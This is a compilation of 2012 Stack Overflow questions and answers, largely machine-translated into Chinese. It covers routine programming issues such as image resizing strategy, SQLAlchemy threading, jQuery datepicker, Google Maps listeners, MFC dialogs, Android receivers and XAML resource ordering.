用户加入我正在构建的站点并将更新一个（或多个）图像。

图像（特别是如果主图像 - 任何任何图像都可以是这个或更改为这个）图像将以不同的尺寸显示 - 总共 5 种不同的尺寸。

```
1 - full original image - lightbox image
2\. - cropped large - main profile image
3\. - cropped medium - search image
4\. - cropped smaller - display of multiple users image
5\. - cropped very small - chat image 
```

所有图像将更改为 jpg 并压缩为 80%，用户将使用 Jcrop 进行裁剪。

我想知道拥有这些图像的最有效方法是什么。

我目前的计划是保存原始图像并在裁剪后再创建 4 张图像。这意味着对于每个图像将有 5 个图像。

有一个更好的方法吗？

我是否应该让最后 3 个（3/4/5）都是相同的图像，只是使用 CSS 的大小不同？

我听说有一个 PHP 函数可以即时更改图像大小，但我也听说这对处理很重，并且可能以它自己的方式效率低下。

想法？建议？

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T07:40:43.440

您的解决方案听起来不错。将图像调整大小设置存储在某处，然后上传图像，创建所需的图像，裁剪，调整大小等。保留原始图像，以便以后您需要添加其他尺寸或进行其他更改。

您只能将原始文件名存储到数据库中，例如`image.jpg`，然后在显示之前添加特定的调整大小的图像前缀，例如：`image_croped_large.jp`.

在选择 CSS 时，我会调整图像大小，不会使用 CSS，因为图像质量会更好，并且图像大小可能会更小。

与下载大图片相比，存储更多图片更便宜。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:41:11.167

光盘空间很便宜，如果您有很多人查看这些图像，为什么要即时进行呢？

只要有一个命名约定。

节省使用处理器，它可以做更好和更有生产力的事情。

# python - Multithreading and Sqlalchemy

> ID：12328939
> 
> 赞同：3
> 
> 时间：2012-09-08T07:33:30.520
> 
> 标签：python, sqlalchemy

I am given the task to update a database over the network with sqlalchemy. I have decided to use python's threading module. Currently I am using 1 thread, aka the producer thread, to direct other threads to consume work units via a queue.

The producer thread does something like this:

```
 def produce(self, last_id):
    unit = session.query(Request).order_by(Request.id) \
        .filter(Request.item_id == None).yield_per(50)
    self.queue.put(unit, True, Master.THREAD_TIMEOUT) 
```

while the consumer threads does something similar to this:

```
 def consume(self):
    unit = self.queue.get()
    request = unit
    item = Item.get_item_by_url(request)
    request.item = item
    session.add(request)
    session.flush() 
```

and I am using sqlalchemy's scoped session:

```
session = scoped_session(sessionmaker(autocommit=True, autoflush=True, bind=engine)) 
```

However, I am getting the exception,

```
"sqlalchemy.exc.InvalidRequestError: Object FOO is already attached to session '1234' (this is '5678')" 
```

I understand that this exception comes from the fact that the request object is created in one session (the producer session) while the consumers are using another scoped session because they belong to another thread.

My work around is to have my producer thread pass in the request.id into the queue while the consumer has to call the code below to retrieve the request object.

```
request = session.query(Request).filter(Request.id == request_id).first() 
```

I do not like this solution because this involves another network call and is obviously not optimal.

1.  Are there ways to avoid wasting the result of the producer's db call?
2.  Is there a way to write the "produce" so that more than 1 id is passed into the queue as a work unit?

Feedback welcomed!

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T07:49:29.200

您需要在将`Request`实例放入队列之前将其与主线程会话分离，然后在再次从队列中取出时将其附加到队列处理线程会话。

要分离，请调用[`.expunge()`](http://docs.sqlalchemy.org/en/rel_0_7/orm/session.html#expunging)会话，传入请求：

```
session.expunge(unit) 
```

然后在队列线程中处理它时，通过[合并](http://docs.sqlalchemy.org/en/rel_0_7/orm/session.html#merging)重新附加它；将该`load`标志设置为 False 以防止再次往返数据库：

```
session.merge(request, load=False) 
```

# javascript - 如何从 datepicker ui 中获取年份？

> ID：12328944
> 
> 赞同：1
> 
> 时间：2012-09-08T07:34:08.447
> 
> 标签：javascript, jquery, jquery-ui

我有用户选择 date 的代码。

我需要获取价值年份并将其放入 div 中。

我怎样才能做到这一点？

[jsFissl 演示](http://jsfiddle.net/centerwow/d7PSX/)

很多谢谢。编码：

```
<div class="demo">
<p>Date: <input type="text" id="datepicker"></p>
</div>
<div id="Year"></div>

$("#datepicker").datepicker({
        changeMonth: true,
        changeYear: true

    });

       $("#Year").text($("#datepicker").val()); 
```

我尝试使用`.substring(0, 4)`，但我不知道如何使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:44:57.763

您也可以将该输入值转换为 Javascript 日期，并从它的方法中获取所有内容。

> [http://jsbin.com/ugaxob/2/edit](http://jsbin.com/ugaxob/2/edit)

```
$(".btn-getdate").click(function() {

  var dt = $("#datepicker").val(),
      d = new Date(dt);    

  $("#Year").text(d.getFullYear());

}); 
```

或者**疯狂**使用[**MomentJs**](http://momentjs.com/)插件，你会得到很多乐趣（更新的实时示例）

* * *

当您想在插件上执行某些操作时，这称为**对事件进行操作**，您应该会在 DatePicker 中看到**Events 选项卡**，您可以在其中找到`onSelect`.

我的实时示例已更改为根据选择进行操作，无需按任何链接或按钮。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:40:10.837

这显示了您想要提取的年份。

HTML：

```
<meta charset="utf-8">
    <div class="demo">
    <p>Date: <input type="text" id="datepicker"></p>
    <button>Show year</button>
</div><!-- End demo --> 
```

JS：

```
$(function() {
    $("#datepicker").datepicker({
        changeMonth: true,
        changeYear: true
    });

    $("button").click(function() {
        var split = $("#datepicker").val().split('/');
        alert(split[2]);
    });
});​ 
```

String 类的[split](http://www.w3schools.com/jsref/jsref_split.asp)方法将字符串分割并作为数组返回。

编辑：这可以满足您的所有需求。看一下[onSelect](http://jqueryui.com/demos/datepicker/#event-onSelect)事件。

```
$(function() {
    $("#datepicker").datepicker({
        changeMonth: true,
        changeYear: true,
        onSelect: function(dateText) { 
            var split = $("#datepicker").val().split('/');
            $("#Year").text(split[2]);
        }
    });
});​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T07:55:13.783

这个怎么样：[JSFiddle](http://jsfiddle.net/d7PSX/12/) 不需要做字符串操作，只需使用选定的日期创建 Date 对象`datepicker`并使用`getFullYear()`方法来获取选定的年份......

```
$(function() {
    $("#datepicker").datepicker({

       onSelect: function(date) {
        var d = new Date(date);
        alert(d.getFullYear());
       },
       changeMonth: true,
       changeYear: true
    });

}); 
```

# asp.net - 如何适当地确定这个变量的范围

> ID：12328948
> 
> 赞同：0
> 
> 时间：2012-09-08T07:34:44.140
> 
> 标签：asp.net, google-maps-api-3, for-loop, scope, event-listener

在我使用 Google maps APIv3 的应用程序中，我试图随机生成一些带有折线的标记。我做了以下事情：

```
//Loop to add locations and draw line
var path= polyline.getPath();
for(var i=0;i<route.length;i++)   //route is an array containing some latlng's
    {
        var marker= new google.maps.Marker({position:route[i],map:map});
        path.push(route[i]);
    }

//Event Listener's
google.maps.event.addListener(marker,'click',function(event)
    {
        iwindow.setContent("<b>Coordinates are:</b><br/>Latitude:"+event.latLng.lat()+"<br/>Longitude:"+event.latLng.lng()); 
          //iwindow is the InfoWindow variable
        iwindow.open(map,marker); 
    }); 
```

这里的问题是单击时的标记始终具有 for 循环中最后一个标记的标记引用。所以只有最后一个标记显示信息窗口。

如何更改我的代码，以便每次标记单击都会生成一个信息窗口？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:39:48.400

每个标记的*回调*都是相同的，因此可以在循环范围之外定义它。但是需要为每个标记附加一个单独的*侦听*器，因此将该代码放入循环中。

```
function showPopup(event) {
    iwindow.setContent("<b>Coordinates are:</b><br/>Latitude:"+event.latLng.lat()+"<br/>Longitude:"+event.latLng.lng()); 
    iwindow.open(map,marker); 
});  

for(var i=0;i<route.length;i++) {
    var marker= new google.maps.Marker({position:route[i],map:map});
    path.push(route[i]);
    google.maps.event.addListener(marker,'click',showPopup);
} 
```

# c++ - Difference between using a pointer and a class for creating a modeless window in MFC

> ID：12328949
> 
> 赞同：0
> 
> 时间：2012-09-08T07:34:49.507
> 
> 标签：c++, mfc

This [resource](http://www.codeproject.com/Articles/1651/Tutorial-Modeless-Dialogs-with-MFC) describes a method of creating a modeless dialog using pointers. They create a pointer that pointer to the dialog class and then use the -> syntax.

```
CModeLess *m_pmodeless = new CModeLess(this);
m_pmodeless->Create(CModeLess::IDD);
m_pmodeless->ShowWindow(SW_SHOW); 
```

I have been doing something like this so far:

```
CModeLess m_pmodeless;
m_pmodeless.Create(IDD_DIALOG);
m_pmodeless.ShowWindow(SW_SHOW); 
```

I do this mainly because I feel comfortable using classes. Is there any disadvantage of using this approach?

Secondly, in the pointer approach I have to do something like this to close the window: (if I am not mistaken)

```
if(m_pmodeless != NULL) { delete m_pmodeless; } 
```

Is there some deletion I have to do If I use classes or is `m_pmodeless.closeWindow()` enough?

I apologize if this is a very basic question, but i'm curious to know.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:39:48.030

这是一个很难回答的问题，因为很大程度上取决于您正在尝试做什么以及 CModeless 是如何实现的。一般来说，避免使用指针是对的，但是 GUI 编程有一些特殊的问题，因为程序中的 C++ 对象代表屏幕上的 GUI 对象，并且协调程序中 C++ 对象的销毁与屏幕上的 GUI 对象可能相当棘手。有时指针是这个问题的最简单的答案。

我假设 m_pmodeless 是另一个类的成员变量。

一个问题是对象的生命周期。在类版本中，当包含对象被销毁时，CModeless 对象将被销毁。这是否适合您取决于您​​的代码。这是否也会破坏无模式对话框取决于 CModeless 的实现方式。如果可以，您需要查看 CModeless 析构函数，如果不能，则需要查看 CModeless 的文档。使用指针版本，您可以明确控制对象何时被销毁，只需在正确的时间调用 delete。

另一个问题是当 GUI 对象被销毁时，一些 GUI 库会自动删除 C++ 对象。像这样的东西（在 Windows 上）

```
case WM_NCDESTROY:
   ...
   // last message received so delete the object
   delete this;
   break; 
```

像这样的代码假设您的所有对象都是堆分配的，并在正确的时间自动为您删除它们。如果 CModeless 是这样写的，那么你别无选择，只能使用指针版本。

# ios - 如何避免手动设置 UIPopoverController 的大小？

> ID：12328960
> 
> 赞同：2
> 
> 时间：2012-09-08T07:37:14.370
> 
> 标签：ios, ipad, uipopovercontroller

当我在弹出窗口中显示 ViewController 时，它会调整视图的大小。为避免这种情况，我必须使用 UIPopoverController setPopoverContentSize:settingsViewSize 手动设置视图大小

我试图覆盖 contentSizeForViewInPopover

```
-(CGSize)contentSizeForViewInPopover
{
    return self.view.frame.size;
} 
```

……但无济于事。

建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T18:42:52.123

Your code doesn't work because `contentSizeForViewInPopover` is called before `viewWillDisplay`, so the frames of the views haven't been set yet. There are a few things you can do though.

If you are using a `UITableViewController` a little known trick to sizing your `UIPopoverViewController` to match the height of your `UITableView` is to use the tableView's `rectForSection` method to give you the height. Use the height in your viewController's `contentSizeForViewInPopover` like this:

```
- (CGSize)contentSizeForViewInPopover 
{
    // Currently no way to obtain the width dynamically before viewWillAppear.
    CGFloat width = 200.0; 
    NSInteger lastSectionIndex = [self.tableView numberOfSections] - 1;
    CGRect rect = [self.tableView rectForSection:lastSectionIndex];
    CGFloat height = CGRectGetMaxY(rect);
    return (CGSize){width, height};
} 
```

Or alternately, you can manually set the `contentSizeForViewInPopopver` property in your viewController's `viewWillAppear:` method and set the popover's size when you create it.

So, in your viewController which will be in the popover, you'll have this:

```
- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    self.contentSizeForViewInPopover = self.view.size
} 
```

And you'd create your popover like this:

```
MyViewController *vc = [self.storyboard instantiateViewControllerWithIdentifier:@"vc"];
self.currentPopover = [[UIPopoverController alloc] initWithContentViewController:vc];
[self.currentPopover presentPopoverFromRect:sender.bounds 
                                     inView:sender 
                   permittedArrowDirections:UIPopoverArrowDirectionUp 
                                   animated:YES];

// resize the popover to match what you set in vc viewDidLoad
[self.currentPopover setPopoverContentSize:vc.contentSizeForViewInPopover animated:NO]; 
```

# java - 在 BroadcastReceiver 上使用 newInstance 时出现 InstantiationException

> ID：12328963
> 
> 赞同：1
> 
> 时间：2012-09-08T07:37:38.173
> 
> 标签：java, android, broadcastreceiver, instantiation

我确实有一个有很多静态方便方法的类。其中一个应该动态启动一个 BroadcastReceiver - 但它总是返回一个 InstantiationException。BroadcastReceiver 有一个无参数的构造函数，所以它应该可以工作——但它没有。这是我到目前为止所做的：

这是其类中的便捷方法：

```
// Static convenience methods in a tools class
public class MyTools {

    // Start BroadcastReceiver dynamically
    public static BroadcastReceiver startBroadcastReceiver(Context context,
            Class<? extends BroadcastReceiver> receiverClass, String receiverTag) {

        BroadcastReceiver receiver = null;

        try {
            receiver = (BroadcastReceiver) receiverClass.newInstance();
            if (receiver != null) {
                IntentFilter intentFilter = new IntentFilter(receiverTag);
                if (intentFilter != null) {
                    context.registerReceiver(receiver, intentFilter);
                }
            }
        } catch (Exception exception) {
            // --> InstantiationException
        }

        return receiver;
    }

    // ...
} 
```

这是一个带有 InnerClass BroadcastReceiver 的活动，它尝试使用这种便捷方法启动 BroadcastReceiver：

```
// An activity with an InnerClass BroadcastReceiver
public class MyActivity extends Activity {

    public class MyBroadcastReceiver extends BroadcastReceiver {

        public static final String TAG = "aa.bb.cc.MyActivity.MyBroadcastReceiver";

        public static final long ACTION_UNDEFINED = 0;
        public static final long ACTION_DOSOMETHING = 1;

        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null) {
                Bundle bundleExtras = intent.getExtras();
                if (bundleExtras != null) {
                    long action = bundleExtras.getLong("ACTION");
                    if (action == ACTION_DOSOMETHING) {
                        doSomething();
                    }
                }
            }
        }
    }

    private MyBroadcastReceiver receiver;

    @Override
    protected void onResume() {
        super.onResume();

        // Start BroadcastReceiver
        receiver = (MyBroadcastReceiver) MyTools.startBroadcastReceiver(this,
                MyBroadcastReceiver.class, MyBroadcastReceiver.TAG);
    }

    public void doSomething() {
        // ...
    }
} 
```

这种方法有什么问题？

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:03:16.277

那就是问题所在

使您广播接收器成为静态内部类 public static class MyBroadcastReceiver extends BroadcastReceiver

或在自己的文件中声明

来自实例化异常的无空构造函数消息可能会令人困惑

# c# - 在磁贴更新上显示应用名称

> ID：12328964
> 
> 赞同：4
> 
> 时间：2012-09-08T07:37:53.450
> 
> 标签：c#, windows-8, microsoft-metro

我正在开发一个简单的应用程序，它会不时更新其磁贴。

我需要我的应用程序始终在磁贴上显示其**名称。**因此，我在我的应用清单中设置`Show Name`为。`All Logos`

问题是当我的应用程序更新其磁贴（使用`TileSquareBlock`磁贴模板）时，应用程序名称将被应用程序徽标替换。

更新后如何将我的应用名称保留在磁贴上？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T14:10:27.540

在磁贴通知 XML 中，指定“名称”作为[品牌](http://msdn.microsoft.com/en-us/library/windows/apps/br212854.aspx)属性的值。使用此属性，可以指定磁贴是否显示应用程序徽标、名称或什么都不显示。

# solr - 加快 solr 索引

> ID：12328969
> 
> 赞同：3
> 
> 时间：2012-09-08T07:39:19.307
> 
> 标签：solr, indexing, dataimporthandler, dih

Solr 索引耗时太长。我正在使用超过 3000 万条记录的 mysql。我正在使用两级子查询。请建议我索引数据的最佳做法，以便我可以加快流程。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-08T17:47:41.697

使用[Indexing_Performance](http://wiki.apache.org/solr/SolrPerformanceFactors#Indexing_Performance)和[ImprovementIndexingSpeed](http://wiki.apache.org/lucene-java/ImproveIndexingSpeed)查看[SolrPerformanceFactors](http://wiki.apache.org/solr/SolrPerformanceFactors)

# c++ - char c[100] 和 char *c 与 cin.getline() 的区别

> ID：12328970
> 
> 赞同：-1
> 
> 时间：2012-09-08T07:39:36.453
> 
> 标签：c++, new-operator, getline, c-strings

我对 cin.getline(char *s, int num_char, char delim); 有一些疑问

有什么区别：

```
char c[100];  
cin.getline(c,100,'\n'); 
```

和

```
char *c = new char[100]; //this is the correct form I want to show you 
cin.getline(c,100,'\n'); 
```

我只知道一件事，第二件事不起作用:-)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T07:48:09.480

您的第二个代码段是语法错误。像这样会起作用

```
char *c = new char[100];  
cin.getline(c,100,'\n'); 
```

两者的区别在于，在第二种情况下，内存是动态分配的。这有两个效果，首先，数组不会自动销毁，在第一个示例中，当您退出声明它的函数时，数组将自动被销毁。第二个效果是，除非您确实销毁了数组，否则`delete[]`会有内存泄漏. 足够多的内存泄漏，你的程序就会崩溃。

根据您希望何时销毁数组、在函数结束时自动或在您使用`delete[]`. 当然你真的应该使用`std::string`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:49:34.470

如果你使用

```
getchar() 
```

或者

```
gets() 
```

返回值将是一个 char*。有时由于缓冲区不干净而出现问题。
所以用以下方法清洁它：

```
cin.ignore() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T07:41:22.333

C++ 不允许您通过`cin`或直接在字符指针中进行输入`getline`。如果要在动态分配的 cstring 中获取输入，请首先在静态 char 数组中获取输入，然后用于`strcpy()`将数据复制到 char 指针中。

在这里查看我的答案 [getline(cin,_string);](https://stackoverflow.com/questions/12026541/getlinecin-string/12026619#12026619)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-08T07:47:43.237

一种是当你调用 c 时是通过引用传递的，而在第二种情况下 c 是作为指针传递的。

第二种情况与以下相同：

```
char c[100];
Char *p = &c;
cin.getline(p,100,'\n'); 
```

# python - 带有线程的 Sqlalchemy session.flush

> ID：12328975
> 
> 赞同：0
> 
> 时间：2012-09-08T07:40:08.793
> 
> 标签：python, sqlalchemy

我目前正在使用 sqlalchemy 提供的 scoped_session，autocommit=True 和 autoflush=True。

我注意到 autoflush 没有被正确调用，因为当我的脚本完成执行时，一些更新的结果没有被刷新。

autoflush 不意味着在多线程环境中与 scoped_session 一起运行吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T12:42:48.353

> autoflush 不意味着在多线程环境中与 scoped_session 一起运行吗？

没有这样的限制，没有。

> 我注意到 autoflush 没有被正确调用，因为当我的脚本完成执行时，一些更新的结果没有被刷新。

这是对自动刷新的误解。Autoflush 旨在在查询向数据库发出 SELECT 之前将待处理的数据刷新到数据库。但是，它不提供在对象的每个属性发生更改时立即刷新数据的功能，因为这将非常低效，并且对于任何类型的 ORM（无论是否为工作单元）都是不可行的。因此，如果您修改了一堆对象，然后丢弃 Session 而不与它进一步交互，那些未决的更改就会丢失。

Autoflush 旨在在事务的上下文中使用。在其默认使用模式下，Session 为您开始一个事务，您只需要在一系列更改准备完成时调用 commit()。请参阅背景文档[http://docs.sqlalchemy.org/en/rel_0_7/orm/session.html#flushing](http://docs.sqlalchemy.org/en/rel_0_7/orm/session.html#flushing)以及**避免自动提交**的强烈建议[http://docs.sqlalchemy.org/en/rel_0_7/ orm/session.html#autocommit-mode](http://docs.sqlalchemy.org/en/rel_0_7/orm/session.html#autocommit-mode)。

# cocoa - 处理将文件从 Finder 拖入受限索引的 NSTableView

> ID：12328978
> 
> 赞同：1
> 
> 时间：2012-09-08T07:40:17.047
> 
> 标签：cocoa, drag-and-drop, nstableview

我有一个现有的 NSTableView 设置为接受从查找器拖动的文件名。我需要将 TableView 限制为最多 10 个条目。

如果用户拖入的文件多于可用插槽，我应该接受拖放并略过任何多余的文件，还是应该拒绝拖放？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-23T07:19:26.767

我会说，填补剩余的插槽，但拒绝下降。从 中返回 YES`-validateDrop:...`但从 中返回 NO `-acceptDrop:...`。

这样，将向用户提示并非所有条目都已添加，但您将有助于添加可添加的项目。

# android - 如何在单击 Android 中的链接时在浏览器列表中显示我的应用程序？

> ID：12328979
> 
> 赞同：0
> 
> 时间：2012-09-08T07:40:32.567
> 
> 标签：android

> **可能重复：**
> [从 android 浏览器启动自定义 android 应用程序](https://stackoverflow.com/questions/2958701/launch-custom-android-application-from-android-browser)

当用户单击链接时，我希望我的应用程序显示在他可以打开应用程序的浏览器列表中。我应该在我的应用程序清单中写什么才能使它起作用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:54:27.757

将此添加到您的活动标签内的清单 xml 中：

```
 <intent-filter> 
             <action android:name="android.intent.action.VIEW" /> 
             <category android:name="android.intent.category.DEFAULT" /> 
             <category android:name="android.intent.category.BROWSABLE" />
        </intent-filter> 
```

# xml - 如何使用 Emacs Lisp 编辑 xml/dom

> ID：12328987
> 
> 赞同：3
> 
> 时间：2012-09-08T07:41:28.003
> 
> 标签：xml, emacs, elisp

如果可能的话，我如何以编程方式在 Emacs Lisp 中编辑 xml 数据？

我需要做的是以编程方式将新节点添加到 xml 中的任意位置：

```
<root>
  <child>
  </child>
</root>

(xml-add-element xml "hello" (xml-element-by-tagname xml "child"))

<root>
  <child>
    <hello></hello>
  </child>
</root> 
```

* * *

**编辑：**我将 xml 解析为 lisp 结构并使用`xml.el`and对其进行编辑`dom.el`，但现在我需要将 lisp 结构**重新转换为 xml data**。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-08T14:11:52.893

这是我的版本，用于将从 xml-parse* 函数创建的 s 表达式转换回 xml 字符串。希望它有帮助！

[https://github.com/upgradingdave/xml-to-string](https://github.com/upgradingdave/xml-to-string)

# java - 使用 Spring Roo 进行用户身份验证和授权

> ID：12328993
> 
> 赞同：0
> 
> 时间：2012-09-08T07:42:10.030
> 
> 标签：java, spring, session, authentication, spring-roo

我是 Spring Roo 的新手，想知道如何实现用户身份验证和授权。我按照教程并专注于 Spring Security，但它并没有真正做到我想要的。我想向用户展示一个登录页面，他们可以在其中输入电子邮件和密码。然后将电子邮件和密码与 MySQL 中的“用户”表进行比较，如果存在，则根据表中的“角色”属性向用户呈现不同的用户界面（例如，医生用户具有不同的用户界面并且患者用户具有不同的界面）。这样做的正确步骤是什么？

我可以很好地连接到 MySQL，我只是不确定如何创建登录页面和创建某种活动会话。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-09T04:35:58.010

[本书](http://www.manning.com/rimple/)的第 8 章（强烈推荐！）详细介绍了如何使用 spring roo 中的数据库设置 Spring Security。阅读该章还将向您展示如何根据角色自定义 UI。或者，该[博客](http://roosbertl.blogspot.co.uk/2010/06/using-spring-security-database-in.html)提供了一些关于使用 roo 设置凭据数据库的建议。

如果您不只是想根据角色自定义 UI，例如，如果您想在登录后根据用户的角色将用户重定向到站点的不同部分，则此[链接](http://oajamfibia.wordpress.com/2011/07/07/role-based-login-redirect/#comment-12)提供两个选项。

# android - 获取所有在android中循环膨胀的edittext值

> ID：12328994
> 
> 赞同：0
> 
> 时间：2012-09-08T07:42:15.513
> 
> 标签：android, layout-inflater

您好，我正在膨胀 xml 文件，例如..

```
List<EditText> allEds3 = new ArrayList<EditText>();

LayoutInflater inflater = inflater = (LayoutInflater) getApplicationContext()
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);

for (int hh1 = 57; hh1 <= 76; hh1++) {
        try {

            View view = inflater.inflate(R.layout.form6, null);
            form6_linear.addView(view);
            lbl1 = (TextView) view.findViewById(R.id.lbl1);
            lbl2 = (TextView) view.findViewById(R.id.lbl2);
            txt1 = (TextView) view.findViewById(R.id.txt1);

            txt1.setId(hh1);
            txt1.setText(txt_array.get(hh1));

            txt1.setOnClickListener(onclicklistener);

            _txt2 = (EditText) view.findViewById(R.id.txt2);

            lbl1.setText(lbl_array.get(hh1));
            lbl2.setText(lbl_array.get(hh1 + 1));

            _txt2.setText(txt_array.get(hh1 + 1));
            allEds3.add(_txt2);

            hh1++;
            nn1++;

        } catch (Exception e) {
            // TODO: handle exception
        }
    } 
```

现在我的主 xml 文件中有一个按钮，单击该按钮我必须获取上面这个**_txt2**的所有值。

请帮忙。

**编辑：**

```
List<EditText> allEds3 = new ArrayList<EditText>();

LayoutInflater inflater = inflater = (LayoutInflater) getApplicationContext()
        .getSystemService(Context.LAYOUT_INFLATER_SERVICE);

for (int hh1 = 57; hh1 <= 76; hh1++) {
    try {

        View view = inflater.inflate(R.layout.form6, null);
        form6_linear.addView(view);
        lbl1 = (TextView) view.findViewById(R.id.lbl1);
        lbl2 = (TextView) view.findViewById(R.id.lbl2);
        txt1 = (TextView) view.findViewById(R.id.txt1);

        txt1.setId(hh1);
        txt1.setText(txt_array.get(hh1));

        txt1.setOnClickListener(onclicklistener);

        _txt2 = (EditText) view.findViewById(R.id.txt2);

        lbl1.setText(lbl_array.get(hh1));
        lbl2.setText(lbl_array.get(hh1 + 1));

        _txt2.setText(txt_array.get(hh1 + 1));
        allEds3.add(_txt2);

        hh1++;
        nn1++;

    } catch (Exception e) {
        // TODO: handle exception
    }
} 
```

**点击()**

```
public void onClick(View v) {
switch (v.getId()) {
    case R.id.btn_continue1:
final String[] strings2 = new String[allEds3.size()];

        for (int i = 0; i < allEds3.size(); i++) {
            strings2[i] = allEds3.get(i).getText().toString();
        }

        int ii = 0;
        for (int db = 57; db <= 76; db++) {
            try {
                j.remove(txt_array.get(db));
                j.put(txt_array.get(db), strings2[ii]);
            } catch (JSONException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            ii++;
        }
    }

} 
```

错误：- ArrayIndexOutOfBounds 在

> j.put(txt_array.get(db), strings2[ii]);

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T09:10:56.427

如果 _txt2 被定义为您的活动类中的一个字段，那么您可以简单地在按钮的 onClick 上获取它：

```
// in onCreate block of your activity
Button button = (Button) findViewById(R.id.button_to_click);
button.setOnClickListener(new OnClickListener() {
    @Override
    public void onClick(View view) {
        // here you can do anything with _txt2 which is just executed when button is clicked
    } 
```

}

**编辑：**我没有正确地弄清楚你的问题，所以我应该添加这个：你可以为你创建的任何 EditText 设置一个 ID。然后在需要时通过 findViewById() 找到它们。或者您可以将所有 EditText(s) 存储在 EditText 数组中，然后再获取它们。

# c# - XAML 中的代码顺序会影响其在 WPF 中的构建相关性吗？

> ID：12328995
> 
> 赞同：0
> 
> 时间：2012-09-08T07:42:21.460
> 
> 标签：c#, wpf, xaml

我之前问过[一个](https://stackoverflow.com/questions/12104274/button-not-enabled-even-after-providing-commandparameter-in-wpf)关于

```
<Button Command="{StaticResource hwc}" CommandParameter="Hello" ... 
```

为了克服我的问题，我被[要求](https://stackoverflow.com/a/12104379/1011959)切换这两个属性的位置，即`CommandParameter`应该先出现，然后是 Command`。这边走

```
<Button CommandParameter="Hello" Command="{StaticResource hwc}" ... 
```

毫无疑问，这件事奏效了。但在我心中留下了几个问题。

1.  属性的顺序重要吗？
2.  同样的原则是否也适用于样式。我的前辈说样式应该在使用之前写入/定义在一个文件中

我设计了一个按钮

```
<Button Style="{StaticResource FooStyle}" .... 
```

并且在声明此按钮后，样式在下方定义

```
<Style x:Key="FooStyle" TargetType="{x:Type Path}" ... 
```

即使在声明按钮之后声明了该样式，该样式是否也会应用于该按钮？

在后面的代码中，我们不能在声明之前使用变量，那么这同样适用于 XAML 代码吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:48:17.263

是的，确实，如果您使用 Style 来引用它，则需要在其用法之上定义您的 Style，`StaticResource`但如果您将其称为 a `DynamicResource`，则顺序无关紧要。它在运行时得到解决。

```
<Button Style={DynamicResource FooStyle}... 
```

[有关StaticResource 与 DynamicResource](https://stackoverflow.com/questions/200839/whats-the-difference-between-staticresource-and-dynamicresource-in-wpf "StaticResource vs DynamicResource")区别的详细说明，请参阅此链接